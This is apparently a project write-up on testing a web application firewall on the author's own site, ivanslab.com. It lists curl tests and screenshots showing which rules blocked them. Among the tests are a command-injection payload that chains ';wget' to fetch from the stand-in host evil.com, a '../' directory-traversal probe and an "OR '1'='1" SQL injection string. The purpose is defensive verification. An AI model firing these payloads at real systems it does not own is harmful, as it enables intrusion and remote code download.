# Testing & Verification

I performed a series of connectivity and attack simulations to verify that each WAF layer was functioning correctly. Below are the results for the key security policies.

---

## Traffic Analysis:

**Observation:**
Throughout the testing phase, the **No-Cookie Challenge** was the single most active defense rule. While the specific attack rules (SQLi, XSS) remained unactive until I manually triggered them, the No-Cookie rule actively filtered out hundreds of unrelated bot requests in the background.

**Key Insight:**
The high volume of No-Cookie triggers demonstrates that the majority of unauthorized web traffic are just a stateless scanners and automated bots rather than targeted exploits.

**Evidence of Traffic Volume:**
*(As shown below on this screenshot, the "No Cookie" rule handled nearly 600 events, with peaks reaching 1600+ events, while specific attack rules only fired during manual testing.)*

<img width="1507" height="688" alt="{02053731-411A-442B-9787-0D5B3C97B8B2}" src="https://github.com/user-attachments/assets/70f5b3da-547c-41b9-828d-a118f8e04f5b" />

---

## Security Rule Verification

### 1. Testing: No-Cookie Challenge
* **Goal:** Verify that requests without a session cookie are challenged to filter out basic bots.
* **Test Command:**
    ```bash
    I did not need to test it manually, since "Events" is full of "no cookie" blocks
    ```
* **Proof:**
  <img width="1526" height="701" alt="{AF557B33-38FF-427E-83EE-CB8A4B3BDF1A}" src="https://github.com/user-attachments/assets/df6e0926-e579-496a-b007-b902ccda0e91" />


---

### 2. Testing: Missing Headers
* **Goal:** Confirm that requests missing standard browser headers (specifically `sec-ch-ua`).
* **Test Command:**
    ```bash
    curl -I https://ivanslab.com
    ```
* **Outcome:** The server returned **403 Forbidden** and request was blocked
* **Proof:**
    <img width="1516" height="670" alt="{1F747B51-38A5-4EFE-BE48-67EC5ACEB296}" src="https://github.com/user-attachments/assets/89b30002-028c-4277-b3bc-b35dc5287012" />


---

### 3. Testing: Wrong HTTP Method
* **Goal:** Ensure that only standard methods (GET, POST, HEAD) are allowed.
* **Test Command:**
    ```bash
    curl -X DELETE https://ivanslab.com
    ```
* **Outcome:** The `DELETE` request was immediately Blocked, reducing the risk of unauthorized protocol abuse.
* **Proof:**
   <img width="1523" height="681" alt="{EB5FCF65-7F50-4CAE-B7FA-03D3C15481C4}" src="https://github.com/user-attachments/assets/56fc2a10-d081-4fe0-afa2-6c33b1f0c221" />

---

### 4. Testing: Directory Traversal
* **Goal:** Attempt to access sensitive system files by navigating out of the web root.
* **Test Command:**
    ```bash
    curl -I "https://ivanslab.com/?fake_attack=../"
    ```
* **Outcome:** The WAF successfully detected the `../` pattern in the query string and **Blocked** the request.
* **Proof:**
   <img width="1496" height="666" alt="{47E325C6-430E-45CE-9D5D-4D920BD1EE10}" src="https://github.com/user-attachments/assets/130005aa-4dc3-43d2-ade4-f6b753fb55c4" />

---

### 5. Testing: Remote Code Execution (Regex Detection)
* **Goal:** Verify that the custom signature rule catches dangerous command injection patterns (like wget or curl) immediately.
* **Test Command:**
    ```bash
    curl -v "https://ivanslab.com/?test=;wget%20http://evil.com"
    ```
* **Quick Note:** The payload `;wget` attempts to chain a new command to download a malicious file from an external server (`evil.com`).
* **Outcome:** The request matched the custom RCE regex pattern and was Blocked before reaching the backend. (even if I do not have one).
* **Proof:**
   <img width="1563" height="606" alt="{AA947DD5-A62F-4AE6-ADAF-3289B345C414}" src="https://github.com/user-attachments/assets/203ce34f-089e-44c8-bbbe-673874c1ca21" />

---

### Testing: SQL Injection (ML Scoring)
* **Goal:** Test if Machine Learning correctly identifies obfuscated or complex attacks that bypass simple regex.
* **Test Command:**
    ```bash
    curl -v "https://ivanslab.com/?id=1' OR '1'='1"
    ```
* **Outcome:** The WAF assigned a low security score (Likely Attack) and Blocked the request.
* **Proof:**
   <img width="1572" height="610" alt="{39E4E233-70E1-4A1B-8D40-28D26BE7137B}" src="https://github.com/user-attachments/assets/7d7609cd-0f31-4be9-8631-7b7601fb0ca8" />

